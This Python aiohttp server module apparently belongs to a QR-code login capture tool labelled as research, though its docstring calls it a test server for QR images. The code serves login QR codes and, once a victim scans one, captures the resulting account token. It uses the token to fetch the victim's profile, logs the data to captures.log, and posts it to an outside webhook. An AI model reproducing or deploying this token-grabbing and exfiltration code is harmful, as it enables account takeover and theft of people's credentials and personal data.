"""Internal HTTP server for QR images and health checks during tests."""

from __future__ import annotations

import asyncio
import json
import logging
from datetime import datetime, timezone
from pathlib import Path
from uuid import UUID

from aiohttp import web

from analysis.data_extraction import fetch_user_profile
from analysis.token_analysis import analyze_token
from config import settings
from interface.state import store
from research.protocol import ProtocolState, RemoteAuthSession

logger = logging.getLogger(__name__)


async def health_handler(_request: web.Request) -> web.Response:
    sessions = await store.list_active()
    ready = sum(1 for s in sessions if s.state == ProtocolState.AWAITING_SCAN)
    return web.json_response(
        {
            "ok": True,
            "enabled": store.enabled,
            "active_sessions": len(sessions),
            "ready_qr": ready,
        }
    )


async def qr_handler(request: web.Request) -> web.Response:
    session_id_raw = request.match_info.get("session_id", "")
    try:
        session_id = UUID(session_id_raw)
    except ValueError:
        return web.json_response({"error": "Invalid session UUID"}, status=400)

    record = await store.get(session_id)
    if not record:
        return web.json_response({"error": "Session not found"}, status=404)

    try:
        png = await store.wait_for_qr(session_id, timeout=45.0)
    except TimeoutError:
        return web.json_response({"error": "QR not ready yet — retry shortly"}, status=503)
    except RuntimeError as exc:
        return web.json_response({"error": str(exc)}, status=410)

    return web.Response(body=png, content_type="image/png", headers={"Cache-Control": "no-store"})


async def session_status_handler(request: web.Request) -> web.Response:
    session_id_raw = request.match_info.get("session_id", "")
    try:
        session_id = UUID(session_id_raw)
    except ValueError:
        return web.json_response({"error": "Invalid session UUID"}, status=400)

    record = await store.get(session_id)
    if not record:
        return web.json_response({"error": "Session not found"}, status=404)

    session = record.session
    return web.json_response(
        {
            "sessionId": str(session.session_id),
            "status": session.state.value,
            "qrReady": session.fingerprint is not None,
            "expiresIn": session.seconds_remaining(),
            "verified": session.state == ProtocolState.COMPLETED,
            "username": session.user_preview.username if session.user_preview else None,
            "error": session.error,
        }
    )


async def create_session_handler(_request: web.Request) -> web.Response:
    if not store.enabled:
        return web.json_response({"error": "Research mode disabled"}, status=403)

    session = await store.create_session()

    async def on_complete(completed: RemoteAuthSession) -> None:
        if not completed.token:
            return
        await _persist_capture(completed)

    await store.start_protocol(session.session_id, on_complete=on_complete)

    return web.json_response(
        {
            "sessionId": str(session.session_id),
            "status": session.state.value,
            "expiresIn": settings.session_ttl_seconds,
        }
    )


async def _persist_capture(session: RemoteAuthSession) -> None:
    if not session.token:
        return

    settings.output_dir.mkdir(parents=True, exist_ok=True)
    analysis = analyze_token(session.token)

    entry: dict[str, object] = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "session_id": str(session.session_id),
        "fingerprint": session.fingerprint,
        "token_analysis": analysis.to_dict(),
    }

    try:
        profile = await fetch_user_profile(session.token)
        entry["profile"] = profile.to_dict()
    except Exception as exc:
        logger.warning("Profile extraction failed: %s", exc)
        entry["profile_error"] = str(exc)

    log_path = settings.output_dir / "captures.log"
    with log_path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry) + "\n")

    if settings.webhook_url:
        await _notify_webhook(session, entry)

    logger.info("Persisted capture for session %s", session.session_id)


async def _notify_webhook(session: RemoteAuthSession, entry: dict[str, object]) -> None:
    import aiohttp

    payload = {
        "content": "Remote auth research capture",
        "session_id": str(session.session_id),
        "profile": entry.get("profile"),
        "token_analysis": entry.get("token_analysis"),
    }
    try:
        async with aiohttp.ClientSession() as http:
            async with http.post(settings.webhook_url, json=payload) as resp:
                if resp.status >= 300:
                    logger.warning("Webhook returned HTTP %s", resp.status)
    except Exception:
        logger.exception("Webhook delivery failed")


async def maintenance_loop(_app: web.Application) -> None:
    while True:
        await asyncio.sleep(60)
        try:
            await store.purge_expired()
        except Exception:
            logger.exception("Session purge failed")


async def on_startup(app: web.Application) -> None:
    app["maintenance_task"] = asyncio.create_task(maintenance_loop(app))


async def on_cleanup(app: web.Application) -> None:
    task = app.get("maintenance_task")
    if task:
        task.cancel()


def create_app() -> web.Application:
    web_dir = Path(__file__).resolve().parents[1] / "web"
    app = web.Application()
    app.router.add_get("/health", health_handler)
    app.router.add_post("/api/session", create_session_handler)
    app.router.add_get("/api/session/{session_id}/status", session_status_handler)
    app.router.add_get("/qr/{session_id}", qr_handler)
    if web_dir.is_dir():
        app.router.add_static("/", web_dir, show_index=True)
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)
    return app


async def start_server() -> web.AppRunner:
    app = create_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, settings.qr_server_host, settings.qr_server_port)
    await site.start()
    logger.info(
        "QR server listening on http://%s:%s",
        settings.qr_server_host,
        settings.qr_server_port,
    )
    return runner
